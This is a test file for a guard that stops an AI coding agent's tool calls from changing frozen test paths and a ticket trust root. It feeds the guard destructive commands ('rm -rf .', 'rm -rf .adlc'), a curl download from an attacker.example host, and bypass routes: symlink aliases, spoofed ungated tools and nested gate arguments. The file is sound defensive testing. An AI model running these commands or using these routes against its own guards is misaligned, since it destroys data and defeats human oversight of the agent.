// rails-checker.test.mjs — AC3 enforcement proof for the OpenCode rails guard.
// Exercises the pure decision (checkRail) and the REAL exported
// tool.execute.before handler against representative payloads. Offline, no
// opencode binary, leaves no trace.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, readdirSync, readFileSync, writeFileSync, rmSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  checkRail, checkToolCall, checkShellCall, extractTargets, spoofCandidateTargets, spoofCandidates, namesAFile, resolveActiveTicketId,
  targetIsRailAncestor, RAILS_SAFE_GATES, CONFLICT_SAFE_GATES,
} from '../rails-checker.mjs';
import { globMatch } from '@adlc/core';
import { adlcRailsGuard } from '../index.mjs';

function repo({ tickets, current } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'oc-rails-'));
  mkdirSync(join(dir, '.adlc'), { recursive: true });
  if (tickets !== undefined) {
    tickets = structuredClone(tickets);
    for (const ticket of tickets.tickets ?? []) ticket.title ??= `${ticket.id} fixture`;
    writeFileSync(join(dir, '.adlc', 'tickets.json'), JSON.stringify(tickets));
  }
  if (current !== undefined) writeFileSync(join(dir, '.adlc', 'current-ticket.json'), JSON.stringify(current));
  return dir;
}
const ON = { ADLC_P4_ENFORCEMENT: '1' };
const T1_RAILED = { tickets: [{ id: 'T1', rails: ['test/**'] }] };

// ---- (a) no-op when .adlc/tickets.json absent ----
test('a: no tickets.json → allow (no-op)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'oc-rails-'));
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (b) no-op when ADLC_P4_ENFORCEMENT != '1' ----
test('b: enforcement off → allow even on a declared rail', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'edit', root: dir, env: { ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (c) no-op when no active ticket ----
test('c: no active ticket → allow', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'edit', root: dir, env: { ...ON } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (d) DENY edit AND write to the active ticket's declared rail ----
// All known mutators (incl. patch/multiedit/apply_patch) AND unknown structured
// tools must be gated; only known read-only tools are skipped (fail closed).
for (const tool of ['edit', 'write', 'patch', 'multiedit', 'apply_patch', 'some_new_tool']) {
  test(`d: ${tool} to a declared rail → deny (gated)`, () => {
    const dir = repo({ tickets: T1_RAILED });
    try {
      const r = checkRail({ filePath: 'test/x.mjs', tool, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny');
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });
}

test('d: a known read-only tool on a rail path → allow (not a mutation)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'read', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (e) DENY edit to .adlc/tickets.json (trust root) even when not declared ----
test('e: edit .adlc/tickets.json (trust root) → deny even when rails do not list it', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**'] }] } });
  try {
    const r = checkRail({ filePath: '.adlc/tickets.json', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (f) a DIFFERENT ticket's rail does NOT block (scope = active ticket only) ----
test('f: another ticket\'s rail does not block (single-active-ticket scope)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['a/**'] }, { id: 'T2', rails: ['b/**'] }] } });
  try {
    const r = checkRail({ filePath: 'b/x.mjs', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (e2) symlink alias to a frozen rail is resolved and denied ----
test('e2: edit via a symlink whose real target is a frozen rail → deny', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**'] }] } });
  try {
    // alias.json (in an otherwise-allowed path) → .adlc/tickets.json (trust root)
    symlinkSync(join(dir, '.adlc', 'tickets.json'), join(dir, 'alias.json'));
    const r = checkRail({ filePath: 'alias.json', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('e2: write through a symlinked parent dir into a frozen rail → deny', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['locked/**'] }] } });
  try {
    mkdirSync(join(dir, 'locked'), { recursive: true });
    symlinkSync(join(dir, 'locked'), join(dir, 'aliasdir')); // aliasdir → locked/
    const r = checkRail({ filePath: 'aliasdir/new.mjs', tool: 'write', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (g) conflicting ADLC_TICKET vs current-ticket.json fails closed ----
test('g: conflicting ADLC_TICKET vs current-ticket.json → deny (fail closed)', () => {
  const dir = repo({ tickets: T1_RAILED, current: { id: 'T2' } });
  try {
    const r = checkRail({ filePath: 'unrelated/x.mjs', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
  assert.equal(resolveActiveTicketId(dir, {}).conflict, false); // sanity: no env, dir gone is fine
});

// ---- (h) the REAL handler: enforce by default, pinned payload shape ----
// v1.17.13 contract: hook receives (input={tool,sessionID,callID}, output={args}).
const IN = (tool) => ({ tool, sessionID: 's_1', callID: 'c_1' });
const OUT = (args) => ({ args });

/** A fake SDK client capturing toast/log calls, mirroring @opencode-ai/sdk's shape. */
function fakeClient() {
  const calls = { toasts: [], logs: [] };
  return {
    calls,
    tui: { showToast: async (req) => { calls.toasts.push(req.body); } },
    app: { log: async (req) => { calls.logs.push(req.body); } },
  };
}

test('h: handler throws to enforce BY DEFAULT (no env opt-in needed)', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    delete process.env.ADLC_ALLOW_ADVISORY_HOOKS;
    delete process.env.ADLC_OPENCODE_ENFORCES; // retired flag must not be needed
    const client = fakeClient();
    const hooks = await adlcRailsGuard({ worktree: dir, client });
    await assert.rejects(
      () => hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'test/x.mjs' })),
      /ADLC rails-guard: blocked/,
    );
    // The deny is surfaced in the TUI, not only stderr (fire-and-forget → settle).
    await new Promise((r) => setImmediate(r));
    assert.equal(client.calls.toasts.length, 1);
    assert.equal(client.calls.toasts[0].variant, 'error');
    assert.match(client.calls.toasts[0].message, /blocked edit/);
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

test('h: args read from output.args (input carries only tool/session/call ids)', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    delete process.env.ADLC_ALLOW_ADVISORY_HOOKS;
    const hooks = await adlcRailsGuard({ worktree: dir });
    // Same payload but the target is NOT a rail → resolves.
    await hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'src/ok.mjs' }));
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

test('h: explicit advisory downgrade → no throw, warning toast instead', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    process.env.ADLC_ALLOW_ADVISORY_HOOKS = '1';
    const client = fakeClient();
    const hooks = await adlcRailsGuard({ worktree: dir, client });
    await hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'test/x.mjs' })); // resolves, no throw
    assert.equal(client.calls.toasts.length, 1);
    assert.equal(client.calls.toasts[0].variant, 'warning');
    assert.match(client.calls.toasts[0].message, /ADVISORY/);
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

test('h: handler survives a client with no tui/app surface (stderr fallback)', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    delete process.env.ADLC_ALLOW_ADVISORY_HOOKS;
    const hooks = await adlcRailsGuard({ worktree: dir, client: {} });
    await assert.rejects(() => hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'test/x.mjs' })));
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

// ---- (i) fail closed on unextractable / synthetic third-party mutators ----
test('i: mutating tool with NO extractable path while rails in force → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'apply_patch', args: { patch: '*** Begin Patch ...' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /no extractable target path/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: synthetic third-party write tool (unknown name, unknown args) → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'write_file', args: { destination: 'test/x.mjs', contents: 'x' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny'); // unknown arg shape → fail closed
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: unextractable path but rails NOT in force → allow (no false deny outside ADLC)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'oc-rails-'));
  try {
    const r = checkToolCall({ tool: 'apply_patch', args: { patch: '...' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow'); // not ADLC-initialized
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: multi-file arg shapes are all checked (edits[] / files[])', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'multiedit', args: { edits: [{ filePath: 'src/ok.mjs' }, { filePath: 'test/x.mjs' }] }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'multiedit', args: { edits: [{ filePath: 'src/ok.mjs' }] }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'patch', args: { files: ['test/x.mjs'] }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: extractTargets covers the tolerated shapes', () => {
  assert.deepEqual(extractTargets({ filePath: 'a' }), ['a']);
  assert.deepEqual(extractTargets({ path: 'b', files: ['c', { filePath: 'd' }], edits: [{ path: 'e' }] }), ['b', 'c', 'd', 'e']);
  assert.deepEqual(extractTargets({ patch: 'not a path field' }), []);
  assert.deepEqual(extractTargets(undefined), []);
  // `typeof null === 'object'`, so the non-object guard needs both halves: a
  // null args object must return empty, not throw inside the gate.
  assert.deepEqual(extractTargets(null), []);
  assert.deepEqual(spoofCandidateTargets(null), []);
  // A host that hands the hook a non-object payload yields no targets rather
  // than reading properties off it.
  assert.deepEqual(extractTargets('test/frozen.test.mjs'), []);
  // Same guard one level down: a null entry inside files[]/edits[] is skipped,
  // not walked into. `typeof null === 'object'`, so the null half is the half a
  // list can actually contain.
  assert.deepEqual(extractTargets({ files: [null], edits: [null] }), []);
  assert.deepEqual(extractTargets({ files: [null, { filePath: 'a' }] }), ['a']);
});

// ---- (j) tool-name normalization + ungated first-party tools ----
test('j: capitalized tool names are normalized (Read allowed, Edit gated)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'Read', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'Edit', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (m) Phase 2.2: bash is GATED in-session via the shell classifier ladder ----
test('m: bash mutation targeting a frozen rail → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'echo x > test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: bash mutation with literal non-rail target → allow', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'echo x > src/ok.txt' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: positively read-only bash → allow; with output-option smuggle → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'git status' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'node --test --test-reporter-destination out.txt' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: opaque / cwd-changing / expanding / pathless mutations → deny (codex ladder)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'git checkout -- test/x.mjs' }, root: dir, env }).reason, /opaque/);
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'cd test && echo x > x.mjs' }, root: dir, env }).reason, /cwd/);
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'echo $CONTENT > test/x.mjs' }, root: dir, env }).reason, /expansion/);
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env }).reason, /neither positively read-only/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (n) P5 CRITICAL: destructive mutation of a rail's ANCESTOR directory ----
test('n: rm/mv of a glob rail parent dir → deny (test/** parent is test)', () => {
  const dir = repo({ tickets: T1_RAILED }); // rails: ['test/**']
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // Directory-affecting shell ops (ancestor detection ON) are denied…
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'mv test test-old' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'chmod -R 000 test' }, root: dir, env }).decision, 'deny');
    // …but a structured single-file write to a non-rail path is NOT ancestor-blocked
    // (writing a file `test` doesn't destroy the frozen `test/**` subtree).
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'notes.md' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: structured single-file write is not ancestor-over-blocked (src/index.mjs vs src/**/test/*.mjs)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/index.mjs' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'edit', args: { filePath: 'src/lib/util.mjs' }, root: dir, env }).decision, 'allow');
    // a direct rail match is still denied
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/a/test/x.mjs' }, root: dir, env }).decision, 'deny');
    // shell dir-destruction under the anchored prefix still denied
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src/a' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: rm of a trust-root ancestor (.adlc) → deny', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**'] }] } });
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'rm -rf .adlc' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: repo-root destruction (rm -rf .) → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: a BLANK/whitespace declared rail cannot neutralize the root guard (rails:[""])', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['', '   ', 'src/**'] }] } });
  try {
    // Blank rails are dropped; `rm -rf .` still hits the (truthy) trust-root token.
    const r = checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
    assert.ok(r.reason.length > 0);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: slash-spelling rails still match direct hits (./test/**, test/, /test/**)', () => {
  for (const rail of ['./test/**', 'test/', '/test/**']) {
    const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: [rail] }] } });
    try {
      assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'deny', `rail spelling ${rail}`);
    } finally { rmSync(dir, { recursive: true, force: true }); }
  }
});

test('n: a SIBLING dir sharing a name prefix is NOT over-blocked (test2 vs test/**)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test2' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'testicular.txt' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: INTERIOR-glob rail ancestor is denied (packages/*/test/** parent packages/foo/test)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['packages/*/test/**'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo/test' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages' }, root: dir, env }).decision, 'deny');
    // a sibling subtree that the interior glob does NOT cover is allowed
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo/src' }, root: dir, env }).decision, 'allow');
    // a same-depth non-matching file is not over-blocked
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'packages/foo/test-notes.md' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: LEADING-** rail does not over-block unrelated file edits (**/*.test.mjs)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['**/*.test.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // A floating rail must NOT make every path its ancestor.
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'README.md' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'edit', args: { filePath: 'src/index.mjs' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'echo x > docs/guide.md' }, root: dir, env }).decision, 'allow');
    // …but a DIRECT match is still denied, and repo-root destruction too.
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/foo.test.mjs' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// DOCUMENTED BOUNDARY (not a bug): a FLOATING leading-** rail has no fixed root
// directory, so in-session ancestor detection cannot flag an arbitrary parent
// dir without denying every unrelated edit (that over-block was rejected). A
// directory deletion under such a rail is therefore caught by the file.edited
// backstop (per-file events) and, authoritatively, by the CI diff gate — the
// two-layer design's whole point. Direct rail hits ARE still denied in-session.
test('n: floating leading-** rail — direct hit denied; bare-parent shell delete is CI-gated (boundary)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['**/*.test.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/foo.test.mjs' }, root: dir, env }).decision, 'deny'); // direct hit still caught
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src' }, root: dir, env }).decision, 'allow');       // no fixed anchor → CI gate + backstop own this
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env }).decision, 'deny');          // repo-root destruction still caught
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: ANCHORED ** still covers its subtree (src/**/test/*.mjs)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src/a' }, root: dir, env }).decision, 'deny'); // under the anchored src/
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf lib' }, root: dir, env }).decision, 'allow'); // different root
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: partial-segment glob does not over-block a same-depth sibling file (test/*.mjs vs test/x.txt)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['test/*.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.txt' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test' }, root: dir, env }).decision, 'deny'); // ancestor of test/*.mjs
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: P5 — read-only prefix cannot shadow a rail-targeting writer (git status && curl -o rail)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'git status && curl -o test/x.mjs https://attacker.example/p' }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
    // chained read-only + non-rail writer still allowed (no over-block)
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'git status && curl -o src/ok.txt https://x' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: bash unverifiable command but enforcement OFF or no ticket → allow (no false denies)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env: { ADLC_TICKET: 'T1' } }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env: { ...ON } }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (k) ungated-name spoofing: an "ungated" tool carrying a rail target is denied ----
// A benign todowrite/question never carries a file-path arg; if one does and it
// resolves to a frozen rail, allowing purely by name would hand a co-installed
// plugin a bypass. (Read-only names stay allowed — reading rails is legitimate;
// that residual class falls to the Phase 2.5 file.edited backstop + CI gate.)
for (const tool of ['todowrite', 'question']) {
  test(`k: ungated "${tool}" carrying a frozen-rail filePath → deny (spoof guard)`, () => {
    const dir = repo({ tickets: T1_RAILED });
    try {
      const r = checkToolCall({ tool, args: { filePath: 'test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny');
      assert.match(r.reason, /ungated tool/);
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });
}

test('k: ungated tool with a NON-rail target stays allowed', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'todowrite', args: { filePath: 'src/ok.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('k: ungated tool with rail target but enforcement OFF → allow (no false denies)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'todowrite', args: { filePath: 'test/x.mjs' }, root: dir, env: { ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (l) operator escape valve: ADLC_UNGATED_TOOLS extends the ungated list ----
test('l: unknown no-target tool is denied by default, allowed when operator-ungated', () => {
  const dir = repo({ tickets: T1_RAILED });
  const base = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // Default: fail closed (an unrecognized write tool must not slip past on arg shape).
    assert.equal(checkToolCall({ tool: 'symbols_index', args: { query: 'foo' }, root: dir, env: base }).decision, 'deny');
    // Operator opt-out: explicitly ungated → allowed.
    const env = { ...base, ADLC_UNGATED_TOOLS: 'symbols_index, other_tool' };
    assert.equal(checkToolCall({ tool: 'symbols_index', args: { query: 'foo' }, root: dir, env }).decision, 'allow');
    // The spoof guard still applies to operator-ungated tools.
    assert.equal(checkToolCall({ tool: 'symbols_index', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (p) P5 cross-model finding: adlc_gate nested argv must not bypass rails ----
test('p: adlc_gate nested arg resolving to a frozen rail → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'gate-manifest', args: ['record', 'preflight', '--dir', 'test'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('p: adlc_gate --flag=value payload resolving to a rail → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'flail-detector', args: ['--scope=test/x.mjs'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('p: adlc_gate with benign nested args (flags, non-rail tokens) → allow', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'rails-guard', args: ['--ticket', 'T1', '--json', '--base', 'main'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (q) P5 re-review: the derived-target CLASS is closed, not just the instance ----
test('q: hollow-test via adlc_gate under rails → deny (derives write targets from its --rails file)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // the attack: a NON-railed ticket file whose rails point AT the frozen path
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'hollow-test', args: ['--rails', 'tmp-ticket.json'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /derives or defaults its write targets/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: unknown/future gate via adlc_gate under rails → deny (fail closed)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'shiny-new-gate', args: [] }, root: dir, env });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: gate-manifest DEFAULT dir (.adlc) railed → deny even with no path token in argv', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.adlc/**'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'gate-manifest', args: ['record', 'preflight'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /manifest\.jsonl/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: gate-manifest default dir NOT railed → allow (mid-build evidence recording stays legal)', () => {
  const dir = repo({ tickets: T1_RAILED }); // rails: test/**
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'gate-manifest', args: ['record', 'preflight'] }, root: dir, env });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

